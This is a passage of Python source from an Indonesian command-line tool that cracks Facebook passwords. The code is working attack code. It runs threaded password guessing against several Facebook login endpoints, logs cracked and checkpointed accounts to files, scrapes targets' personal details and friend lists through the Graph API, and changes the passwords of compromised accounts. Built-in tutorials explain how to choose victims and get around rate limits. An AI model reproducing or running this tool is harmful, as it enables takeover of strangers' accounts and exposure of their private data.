                            break
                        else:
                            jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
                            menu()
                    elif put in ['3','03','003','c']:
                        puf = input(' [?] munculkan opsi saat crack? [Y/t]: ')
                        if puf in ['']:
                            jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
                            menu()
                        elif puf in ['1','01','001','y','Y']:
                            started()
                            ThreadPool(35).map(self.free_opsi,self.fl)
                            os.remove(self.apk)
                            exit()
                            break
                        elif puf in ['2','02','002','t','T']:
                            started()
                            ThreadPool(35).map(self.free,self.fl)
                            os.remove(self.apk)
                            exit()
                            break
                        else:
                            jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
                            menu()
                    else:
                        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
                        menu()
                except Exception as e:
                    print(("   %s"%e))
    def pwlist(self):
        self.pw = input('%s╠══[%s•%s] %sMasukkan Password : '%(O,P,O,P)).split(",")
        if len(self.pw) ==0:
            self.pwlist()
        else:
            for i in self.fl:
                i.update({"pw":self.pw})
            start_method()
            put = input('%s╠══[%s•%s] %sPilih : '%(O,P,O,P))
            print('%s║'%(O))
            if put in ['']:
                jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
                menu()
            elif put in ['1','01','001','a']:
                print('%s╠══[%s•%s] %sMunculkan Opsi CP? [y/t]'%(O,P,O,P))
                puf = input('%s╠══[%s•%s] %sPilih : '%(O,P,O,P))
                if puf in ['']:
                    jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
                    menu()
                elif puf in ['1','01','001','y','Y']:
                    started()
                    ThreadPool(30).map(self.api_opsi,self.fl)
                    os.remove(self.apk)
                    exit()
                elif puf in ['2','02','002','t','T']:
                    started()
                    ThreadPool(30).map(self.api,self.fl)
                    os.remove(self.apk)
                    exit()
                else:
                    jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
                    menu()
            elif put in ['2','02','002','b']:
                print('%s╠══[%s•%s] %sMunculkan Opsi CP? [y/t]'%(O,P,O,P))
                puf = input('%s╠══[%s•%s] %sPilih : '%(O,P,O,P))
                if puf in ['']:
                    jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
                    menu()
                elif puf in ['1','01','001','y','Y']:
                    started()
                    ThreadPool(30).map(self.mbasic_opsi,self.fl)
                    os.remove(self.apk)
                    exit()
                elif puf in ['2','02','002','t','T']:
                    started()
                    ThreadPool(30).map(self.mbasic,self.fl)
                    os.remove(self.apk)
                    exit()
                else:
                    jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
                    menu()
            elif put in ['3','03','003','c']:
                print('%s╠══[%s•%s] %sMunculkan Opsi CP? [y/t]'%(O,P,O,P))
                puf = input('%s╠══[%s•%s] %sPilih : '%(O,P,O,P))
                if puf in ['']:
                    jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
                    menu()
                elif puf in ['1','01','001','y','Y']:
                    started()
                    ThreadPool(30).map(self.free_opsi,self.fl)
                    os.remove(self.apk)
                    exit()
                elif puf in ['2','02','002','t','T']:
                    started()
                    ThreadPool(30).map(self.free,self.fl)
                    os.remove(self.apk)
                    exit()
                else:
                    jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
                    menu()
            else:
                jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
                menu()
    def api(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_api(fl.get("id"),
                    i,"https://b-api.facebook.com")
                if log.get("status")=="cp":
                    print("\r  %s* --> %s|%s               "%(K,fl.get("id"),i))
                    self.cp.append("%s|%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    print("\r%s[%sOK%s] %s • %s               "%(H,P,H,fl.get("id"),i))
                    self.ada.append("%s•%s"%(fl.get("id"),i))
                    open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                else:continue
                    
            self.ko+=1
            print("\r [*] [crack] %s/%s OK:-%s CP:-%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
        except:
            self.api(fl)
    def api_opsi(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_api(fl.get("id"),
                    i,"https://b-api.facebook.com")
                if log.get("status")=="cp":
                    h_cp = "\r  %s* --> %s|%s               "%(K,fl.get("id"),i)
                    cek_log(fl.get("id"),i,h_cp)
                    self.cp.append("%s|%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s|%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    print("\r%s[%sOK%s] %s • %s               "%(H,P,H,fl.get("id"),i))
                    print("")
                    self.ada.append("%s•%s"%(fl.get("id"),i))
                    open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                else:continue
                    
            self.ko+=1
            print("\r [*] [crack] %s/%s OK:-%s CP:-%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
        except:
            self.api_opsi(fl)
    def mbasic(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_mbasic(fl.get("id"),
                    i,"https://mbasic.facebook.com")
                if log.get("status")=="cp":
                    try:
                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open("token.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"]
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        print("\r%s  * --> %s|%s|%s %s %s   "%(K,fl.get("id"),i,d,m,y))
                        self.cp.append("%s|%s|%s %s %s"%(fl.get("id"),i,d,m,y))
                        open("CP/%s.txt"%(tanggal),"a+").write("%s|%s|%s %s %s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    print("\r%s  * --> %s|%s               "%(K,fl.get("id"),i))
                    self.cp.append("%s|%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s|%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    print("\r%s[%sOK%s] %s • %s • %s              "%(H,P,H,fl.get("id"),i,koki(log.get("cookies"))))
                    self.ada.append("%s•%s"%(fl.get("id"),i))
                    open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                else:continue
                    
            self.ko+=1
            print("\r [*] [crack] %s/%s OK:-%s CP:-%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
        except:
            self.mbasic(fl)
    def mbasic_opsi(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_mbasic(fl.get("id"),
                    i,"https://mbasic.facebook.com")
                if log.get("status")=="cp":
                    try:
                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open("token.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"]
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        h_cp = "\r%s  * --> %s|%s|%s %s %s   "%(K,fl.get("id"),i,d,m,y)
                        cek_log(fl.get("id"),i,h_cp)
                        self.cp.append("%s|%s|%s %s %s"%(fl.get("id"),i,d,m,y))
                        open("CP/%s.txt"%(tanggal),"a+").write("%s|%s|%s %s %s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    h_cp = "\r%s  * --> %s|%s               "%(K,fl.get("id"),i)
                    cek_log(fl.get("id"),i,h_cp)
                    self.cp.append("%s|%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s|%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    print("\r%s[%sOK%s] %s • %s • %s               "%(H,P,H,fl.get("id"),i,koki(log.get("cookies"))))
                    print("")
                    self.ada.append("%s•%s"%(fl.get("id"),i))
                    open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                else:continue
                    
            self.ko+=1
            print("\r [*] [crack] %s/%s OK:-%s CP:-%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
        except:
            self.mbasic_opsi(fl)
    def free(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_free(fl.get("id"),
                    i,"https://free.facebook.com")
                if log.get("status")=="cp":
                    try:
                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open("token.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"]
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        print("\r%s  * --> %s|%s|%s %s %s   "%(K,fl.get("id"),i,d,m,y))
                        self.cp.append("%s|%s|%s %s %s"%(fl.get("id"),i,d,m,y))
                        open("CP/%s.txt"%(tanggal),"a+").write("%s|%s|%s %s %s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    print("\r%s  * --> %s|%s               "%(K,fl.get("id"),i))
                    self.cp.append("%s|%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s|%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    print("\r%s[%sOK%s] %s • %s • %s               "%(H,P,H,fl.get("id"),i,koki(log.get("cookies"))))
                    self.ada.append("%s•%s"%(fl.get("id"),i))
                    open("OK/%s.txt"%(tanggal),"a+").write("%s|%s\n"%(fl.get("id"),i))
                    break
                else:continue
                    
            self.ko+=1
            print("\r [*] [crack] %s/%s OK:-%s CP:-%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
        except:
            self.free(fl)
    def free_opsi(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_free(fl.get("id"),
                    i,"https://free.facebook.com")
                if log.get("status")=="cp":
                    try:
                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open("token.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"]
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        h_cp = "\r%s  * --> %s|%s|%s %s %s   "%(K,fl.get("id"),i,d,m,y)
                        cek_log(fl.get("id"),i,h_cp)
                        self.cp.append("%s|%s|%s %s %s"%(fl.get("id"),i,d,m,y))
                        open("CP/%s.txt"%(tanggal),"a+").write("%s|%s|%s %s %s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    h_cp = "\r%s  * --> %s|%s               "%(K,fl.get("id"),i)
                    cek_log(fl.get("id"),i,h_cp)
                    self.cp.append("%s|%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s|%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    print("\r%s[%sOK%s] %s • %s • %s               "%(H,P,H,fl.get("id"),i,koki(log.get("cookies"))))
                    print("")
                    self.ada.append("%s•%s"%(fl.get("id"),i))
                    open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                else:continue
                    
            self.ko+=1
            print("\r [*] [crack] %s/%s OK:-%s CP:-%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
        except:
            self.free_opsi(fl)

### Mendapat Data Target
def target():
    try:token = open('token.txt','r').read()
    except (KeyError,IOError):jalan('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P));menu_log()
    idt = input("%s╠══[%s•%s] %sID Target : "%(O,P,O,P))
    try:
        zx = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token);zy = json.loads(zx.text)
    except (KeyError,IOError):jalan('%s╚══[%s!%s] %sID Tidak Ditemukan'%(M,P,M,P));menu()
    try:nm = zy["name"]
    except (KeyError,IOError):nm = ("-")
    try:nd = zy["first_name"]
    except (KeyError,IOError):nd = ("-")
    try:nt = zy["middle_name"]
    except (KeyError,IOError):nt = ("-")
    try:nb = zy["last_name"]
    except (KeyError,IOError):nb = ("-")
    try:ut = zy["birthday"]
    except (KeyError,IOError):ut = ("-")
    try:gd = zy["gender"]
    except (KeyError,IOError):gd = ("-")
    try:em = zy["email"]
    except (KeyError,IOError):em = ("-")
    try:lk = zy["link"]
    except (KeyError,IOError):lk = ("-")
    try:us = zy["username"]
    except (KeyError,IOError):us = ("-")
    try:rg = zy["religion"]
    except (KeyError,IOError):rg = ("-")
    try:rl = zy["relationship_status"]
    except (KeyError,IOError):rl = ("-")
    try:rls = zy["significant_other"]["name"]
    except (KeyError,IOError):rls = ("-")
    try:lc = zy["location"]["name"]
    except (KeyError,IOError):lc = ("-")
    try:ht = zy["hometown"]["name"]
    except (KeyError,IOError):ht = ("-")
    try:ab = zy["about"]
    except (KeyError,IOError):ab = ("-")
    try:lo = zy["locale"]
    except (KeyError,IOError):lo = ("-")
    jalan('%s╠══[%s•%s] %sNama : %s'%(O,P,O,P,nm))
    jalan('%s╠══[%s•%s] %sNama Depan : %s'%(O,P,O,P,nd))
    jalan('%s╠══[%s•%s] %sNama Tengah : %s'%(O,P,O,P,nt))
    jalan('%s╠══[%s•%s] %sNama Belakang : %s'%(O,P,O,P,nb))
    jalan('%s╠══[%s•%s] %sTTL : %s'%(O,P,O,P,ut))
    jalan('%s╠══[%s•%s] %sGender : %s'%(O,P,O,P,gd))
    jalan('%s╠══[%s•%s] %sEmail : %s'%(O,P,O,P,em))
    jalan('%s╠══[%s•%s] %sLink : %s'%(O,P,O,P,lk))
    jalan('%s╠══[%s•%s] %sUsername : %s'%(O,P,O,P,us))
    jalan('%s╠══[%s•%s] %sAgama : %s'%(O,P,O,P,rg))
    jalan('%s╠══[%s•%s] %sStatus Hubungan : %s'%(O,P,O,P,rl))
    jalan('%s╠══[%s•%s] %sHubungan Dengan : %s'%(O,P,O,P,rls))
    jalan('%s╠══[%s•%s] %sTempat Tinggal : %s'%(O,P,O,P,lc))
    jalan('%s╠══[%s•%s] %sTempat Asal : %s'%(O,P,O,P,ht))
    jalan('%s╠══[%s•%s] %sTentang : %s'%(O,P,O,P,ab))
    jalan('%s╠══[%s•%s] %sLocale : %s'%(O,P,O,P,lo))
    print('%s║'%(O))
    input('%s╚══[ %sKembali %s]%s'%(O,P,O,P))
    menu()

### Mendapat Jumlah Teman Target
def teman_target():
    it = input('%s╠══[%s•%s] %sID Target : '%(O,P,O,P))
    try:
        token = open('token.txt','r').read()
        mm = requests.get('https://graph.facebook.com/%s?access_token=%s'%(it,token))
        nn = json.loads(mm.text)
        print ('%s╠══[%s•%s] %sNama : %s'%(O,P,O,P,nn['name']))
    except (KeyError,IOError):
        jalan('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P))
        menu_log()
    tt=[]
    te=[]
    lim = input('%s╠══[%s•%s] %sLimit Dump : '%(O,P,O,P))
    print('%s║%s'%(O,P))
    ada = requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(it,lim,token))
    idi = json.loads(ada.text)
    for x in idi['data']:
        tt.append(x['id'])
    for id in tt:
        try:
            ada2 = requests.get('https://graph.facebook.com/%s/friends?access_token=%s'%(id,token))
            idi2 = json.loads(ada2.text)
            try:
                for b in idi2['data']:
                    te.append(b['id'])
            except KeyError:
                print('╠══[!] Private')
            print('╠══[•]',id,'•',len(te))
            te.clear()
        except KeyError:
            print('╠══[!] Akun Terkena Spam')
    print('║')
    input('╚══[ Kembali ]')
    menu()

### Menu Mengecek Hasil Crack
def hasil():
    os.system("clear")
    logo()
    jalan('%s╔══[ %sHasil Crack %s]'%(O,P,O))
    print('%s║'%(O))
    print('%s╠══[%s1%s] %sCek Hasil OK'%(O,P,O,P))
    print('%s╠══[%s2%s] %sCek Hasil CP'%(O,P,O,P))
    ch = input('%s╠══[%s•%s] %sPilih : '%(O,P,O,P))
    if ch in ['']:
        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
        menu()
    elif ch in ['1','01','001','a']:
        try:
            okl = os.listdir("OK")
            print('%s║'%(O))
            print('%s╠══[%s Hasil Crack Yang Tersimpan Di File OK %s]'%(O,P,O))
            print('%s║'%(O))
            for file in okl:
                print('%s╠══[%s•%s] %s%s'%(O,P,O,P,file))
            print('%s║'%(O))
            files = input('%s╚══[%s•%s] %sMasukkan Nama File : '%(O,P,O,P))
            print('')
            if files == "":
                jalan('%s═══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
                hasil()
            os.system('cat OK/%s'%(files))
            ppp = open("OK/%s"%(files)).read().splitlines()
            del1 = ("%s"%(files)).replace("-", " ").replace(".txt", "")
            print('\n%s╔══[%s•%s] %sTotal Hasil Crack Tanggal %s Adalah %s Akun'%(O,P,O,P,del1,len(ppp)))
        except (KeyError,IOError):
            print('%s╠══[%s Hasil Tidak Ditemukan %s]'%(M,P,M))
    elif ch in ['2','02','002','b']:
        try:
            cpl = os.listdir("CP")
            print('%s║'%(O))
            print('%s╠══[%s Hasil Crack Yang Tersimpan Di File CP %s]'%(O,P,O))
            print('%s║'%(O))
            for file in cpl:
                print('%s╠══[%s•%s] %s%s'%(O,P,O,P,file))
            print('%s║'%(O))
            files = input('%s╚══[%s•%s] %sMasukkan Nama File : '%(O,P,O,P))
            print('')
            if files == "":
                jalan('%s═══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
                hasil()
            os.system('cat CP/%s'%(files))
            ppp = open("CP/%s"%(files)).read().splitlines()
            del1 = ("%s"%(files)).replace("-", " ").replace(".txt", "")
            print('\n%s╔══[%s•%s] %sTotal Hasil Crack Tanggal %s Adalah %s Akun'%(O,P,O,P,del1,len(ppp)))
        except (KeyError,IOError):
            print('%s╠══[%s Hasil Tidak Ditemukan %s]'%(M,P,M))
    else:
        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
        menu()
    print('%s║'%(O))
    input('%s╚══[ %sKembali %s]%s'%(O,P,O,P))
    menu()

### Mengecek Opsi CP Hasil Crack
def log_hasil(user, pasw):
    ua = "Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
    ses = requests.Session()
    ses.headers.update({
    "Host": "mbasic.facebook.com",
    "cache-control": "max-age=0",
    "upgrade-insecure-requests": "1",
    "origin": host,
    "content-type": "application/x-www-form-urlencoded",
    "user-agent": ua,
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "x-requested-with": "mark.via.gp",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    "sec-fetch-dest": "document",
    "referer": host+"/login/?next&ref=dbl&fl&refid=8",
    "accept-encoding": "gzip, deflate",
    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    })
    data = {}
    ged = par(ses.get(host+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
    fm = ged.find("form",{"method":"post"})
    list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
    for i in fm.find_all("input"):
        if i.get("name") in list:
            data.update({i.get("name"):i.get("value")})
        else:
            continue
    data.update({"email":user,"pass":pasw})
    try:
        run = par(ses.post(host+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
    except requests.exceptions.TooManyRedirects:
        print(" %s[!] akun anda terkena spam"%(M))
    if "c_user" in ses.cookies:
        print(" %s[✓] akun ok tidak checkpoint"%(H))
    elif "checkpoint" in ses.cookies:
        form = run.find("form")
        dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
        jzst = form.find("input",{"name":"jazoest"})["value"]
        nh   = form.find("input",{"name":"nh"})["value"]
        dataD = {
            "fb_dtsg": dtsg,
            "fb_dtsg": dtsg,
            "jazoest": jzst,
            "jazoest": jzst,
            "checkpoint_data":"",
            "submit[Continue]":"Lanjutkan",
            "nh": nh
        }
        xnxx = par(ses.post(host+form["action"], data=dataD).text, "html.parser")
        ngew = [yy.text for yy in xnxx.find_all("option")]
        if(str(len(ngew))=="0"):
            print(" %s[✓] akun one tap/bisa dibuka"%(H))
        else:
            print(" %s[*] terdapat %s opsi"%(P,str(len(ngew))))
        for opt in range(len(ngew)):
            print(" "+K+"["+str(opt+1)+"]. "+ngew[opt])
    elif "login_error" in str(run):
        oh = run.find("div",{"id":"login_error"}).find("div").text
        print(" %s[!] %s"%(M,oh))
    else:
        print(" %s[!] password telah diubah "%(M))
def cek_hasil():
    jalan(' [*] cek hasil akun disini')
    print(' [*] contoh file : CP/%s.txt'%(tanggal))
    files = input(' [?] nama file : ')
    try:
        buka_baju = open(files,"r").readlines()
    except FileNotFoundError:
        print("%s╚══[%s!%s] %sFile Tidak Ada"%(M,P,M,P))
        time.sleep(2); cek_hasil()
    print(" [+] jumlah akun : %s"%(str(len(buka_baju))))
    print("")
    for memek in buka_baju:
        kontol = memek.replace("\n","")
        titid  = kontol.split("|")
        print(" %s[✓] cek akun : %s"%(P,kontol))
        try:
            log_hasil(titid[0], titid[1])
        except requests.exceptions.ConnectionError:
            continue
        print("")
    print("")
    print(' [*] selesai cek...')
    input(' [*] tekan ENTER untuk kembali ')
    menu()

### Variasi Teks
def var_menu():
    print('%s╔══[ %sPilih Metode Login %s]'%(O,P,O))
    print('%s║'%(O))
    print('%s╠══[%s1%s] %sLogin Dengan Token'%(O,P,O,P))
    print('%s╠══[%s2%s] %sLogin Dengan Cookies'%(O,P,O,P))
    print('%s╠══[%s3%s] %sTutorial Penggunaan Script'%(O,P,O,P))
    print('%s╠══[%s4%s] %sInfo Author & Team Project'%(O,P,O,P))
    print('%s╠══[%s0%s] %sKeluar'%(O,P,O,P))
def var_tutor():
    mlaku('%s╔══[%s Tips & Tutorial %s]'%(O,P,O))
    print('%s║'%(O))
    print('%s╠══[%s1%s] %sCara Mengambil Token'%(O,P,O,P))
    print('%s╠══[%s2%s] %sCara Mengambil Cookies'%(O,P,O,P))
    print('%s╠══[%s3%s] %sCara Mendapatkan Target'%(O,P,O,P))
    print('%s╠══[%s4%s] %sCara Selama Proses Crack'%(O,P,O,P))
def tutor_target():
    mlaku('%s╠═══╦══════════════════════════════════════════════════════╗'%(O))
    mlaku('%s║ %s1 %s║ %sSiapkan Akun Tumbal Di Chrome Untuk Proses Crack     %s║'%(O,P,O,P,O))
    mlaku('%s║ %s2 %s║ %sGanti Password Akun Tumbal Terlebih Dahulu           %s║'%(O,P,O,P,O))
    mlaku('%s║ %s3 %s║ %sCari Target Akun Random, Daftar Teman Harus Publik   %s║'%(O,P,O,P,O))
    mlaku('%s║ %s4 %s║ %sTeman (FL) Bebas, Bisa 1K, 2K, 3K, ,4K, Atau 5K      %s║'%(O,P,O,P,O))
    mlaku('%s║ %s5 %s║ %sMakin Banyak Teman, Kemungkinan Makin Banyak Hasil   %s║'%(O,P,O,P,O))
    mlaku('%s║ %s6 %s║ %sKetuk Foto Profil/Sampul Target                      %s║'%(O,P,O,P,O))
    mlaku('%s║ %s7 %s║ %sLihat URL/Link Di Bagian Atas, Terdapat \'id=10001xx\' %s║'%(O,P,O,P,O))
    mlaku('%s║ %s8 %s║ %sNah, Itu Adalah ID Target Yang Siap Untuk Di Crack   %s║'%(O,P,O,P,O))
    mlaku('%s║ %s9 %s║ %sBuka Termux/Linux Kemudian Lanjut Ke Proses Crack    %s║'%(O,P,O,P,O))
    mlaku('%s╠═══╩══════════════════════════════════════════════════════╝'%(O))
    print('%s║'%(O))
def tutor_crack():
    mlaku('%s╠═══╦══════════════════════════════════════════════════════╗'%(O))
    mlaku('%s║ %s1 %s║ %sMetode Api : Proses Cepat Tapi Mudah Spam            %s║'%(O,P,O,P,O))
    mlaku('%s║ %s2 %s║ %sMetode Mbasic : Proses Agak Cepat, Jarang Kena Spam  %s║'%(O,P,O,P,O))
    mlaku('%s║ %s3 %s║ %sMetode Mobile : Proses Lambat, Kemungkinan OK Besar  %s║'%(O,P,O,P,O))
    mlaku('%s║ %s4 %s║ %sCrack Menggunakan Kuota Data (Tidak Support Wifi)    %s║'%(O,P,O,P,O))
    mlaku('%s║ %s5 %s║ %sApabila Hasil Tidak Muncul Saat Crack Berjalan       %s║'%(O,P,O,P,O))
    mlaku('%s║ %s6 %s║ %sAktifkan Mode Pesawat 5 Detik Saja                   %s║'%(O,P,O,P,O))
    mlaku('%s╠═══╩══════════════════════════════════════════════════════╝'%(O))
    print('%s║'%(O))
def var_author():
    mlaku('%s╔══[ %sAuthor & Team Project %s]'%(O,P,O))
    mlaku('%s║'%(O))
    mlaku('%s╠══[%s•%s] %sAuthor :'%(O,P,O,P))
    mlaku('%s║     • %sDapunta Khurayra X'%(O,P))
    mlaku('%s║     • %sMuhamad Rizal Fiansyah Id'%(O,P))
    mlaku('%s║'%(O))
    mlaku('%s╠══[%s•%s] %sTeam Project %sXNSCODE%s :'%(O,P,O,P,O,P))
    mlaku('%s║     • %sAngga Kurniawan'%(O,P))
    mlaku('%s║     • %sYayan XD'%(O,P))
    mlaku('%s║     • %sBoy Hamzah'%(O,P))
    mlaku('%s║     • %sLatip Harkat'%(O,P))
    mlaku('%s║     • %sZacky Tricker'%(O,P))
    mlaku('%s║     • %sSutan Ubay'%(O,P))
    mlaku('%s║     • %sRizky Dev'%(O,P))
    mlaku('%s║     • %sIqbal Dev'%(O,P))
    mlaku('%s║     • %sAap Afandi'%(O,P))
    mlaku('%s║     • %sFallen'%(O,P))
    mlaku('%s║     • %sHanifan'%(O,P))
    mlaku('%s║     • %sRizky Leviathan'%(O,P))
    mlaku('%s║'%(O))
def var_ugen():
    print("%s╠══[%s1%s] %sDapatkan User Agent"%(O,P,O,P))
    print("%s╠══[%s2%s] %sGanti User Agent %s(%sManual%s)"%(O,P,O,P,O,P,O))
    print("%s╠══[%s3%s] %sGanti User Agent %s(%sSesuaikan HP%s)"%(O,P,O,P,O,P,O))
    print("%s╠══[%s4%s] %sHapus User Agent"%(O,P,O,P))
    print("%s╠══[%s5%s] %sCek User Agent"%(O,P,O,P))
    print("%s╠══[%s0%s] %sKembali"%(O,P,O,P))
def start_method():
    print("\n %s[ pilih method login - silahkan coba satu² ]\n"%(P))
    print(' [1] metode API (fast)')
    print(' [2] metode mbasic (slow) ')
    print(' [3] metode freefb (very slow) ')
def start_methodezz():
    print('%s║'%(O))
    print('%s╠══[%s1%s] %sCrack Cepat %s[%sHasil Sedikit%s]'%(O,P,O,P,O,P,O))
    print('%s╠══[%s2%s] %sCrack Lambat %s[%sHasil Banyak%s]'%(O,P,O,P,O,P,O))
    print('%s╠══[%s3%s] %sCrack Sangat Lambat %s[%sHasil Lebih Banyak%s]'%(O,P,O,P,O,P,O))
def started():
    print('\n [+] hasil OK disimpan ke -> OK/%s.txt' % (tanggal))
    print(' [+] hasil CP disimpan ke -> CP/%s.txt' % (tanggal))
    print('\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n')

### Membuat Folder Direktori
def folder():
    try:os.mkdir("CP")
    except:pass
    try:os.mkdir("OK")
    except:pass

pilih = []
san_ttl = []
pw_tap = []
tap_yes = []
ttl__ = []
def seting_pw_tap_yes():
	tap_yes.append("Dev")
	global pw_new
	while True:
		
		pil_pw = input(" [?] ubah sandi untuk akun tap yes? [Y/t]: ")
		if pil_pw == "y" or pil_pw == "Y":
			pw_tap.append("IqbalDev")
			break
		elif "t" == pil_pw or "T" == pil_pw:
			pw_new = ""
			break
		else:
			pass

	if len(pw_tap) != 0:		
		while True:
			
			print(" [*] masukan sandi untuk akun tap yes contoh : sayang,anjing")
			pw_new = input(" [?] masukan sandi : ")
			if len(pw_new) < 6:
				print(" [!] minimal 6 karakter")
			else:
				break
	if len(ttl__) != 0:
		while True:
			
			pil = input(" [?] tambahkan sandi untuk akun ttl? [Y/t]: ")
			if "y" in pil or "Y" in pil:
				san_ttl.append("Dev")
				break
			elif "n" in pil or "N" in pil:
				break
			else:
				pass

tampil_ttl = []
ganti_pw = []
batas = ("---------------------------------------------")
def _iqbal_dev_pw_new_(pw_new_, data, uid, ses_dev, respon_2, pw):
	try:
		apk_dev = []
		global tampil_ttl, tap_yes
		sop_dev_2 = BeautifulSoup(respon_2.content, "html.parser")
		form = sop_dev_2.find("form")
		url_post_2 = form["action"]
		submit_2 = sop_dev_2.find("input", attrs={"name": "submit[Next]"})["value"]
		nh_2 = sop_dev_2.find("input", attrs={"name": "nh"})["value"]
		payload = {}
		for dev in form:
			input = dev
			payload[input.get("name")] = input.get("value")
								
		payload.update({"nh": nh_2, "submit[Next]": submit_2, "password_new": pw_new_})
		respon_3 = ses_dev.post("https://mbasic.facebook.com"+url_post_2, data=payload)
		try:
			respon_4 = ses_dev.get("https://mbasic.facebook.com/me/friends?")
			if "zero/optin/legal/" in respon_4.text:
				try:
					sop_gr = BeautifulSoup(respon_4.content, "html.parser").find("form")
					url_post = sop_gr["action"]
					payload = {}
					for dev in sop_gr:
						input = dev
						payload[input.get("name")] = input.get("value")
					ses_dev.post("https://mbasic.facebook.com"+url_post, data=payload)
					respon_4 = ses_dev.get("https://mbasic.facebook.com/me/friends?")
				except:
					pass
			sop_dev = BeautifulSoup(respon_4.content, "html.parser")
			jm_teman = sop_dev.find("h3").text
			jm_teman_ = jm_teman.replace("(", "\033[92;1m(\033[97;1m").replace(")", "\033[92;1m)")
			jumlah_teman =(" [*] teman : \n"%(jm_teman_))
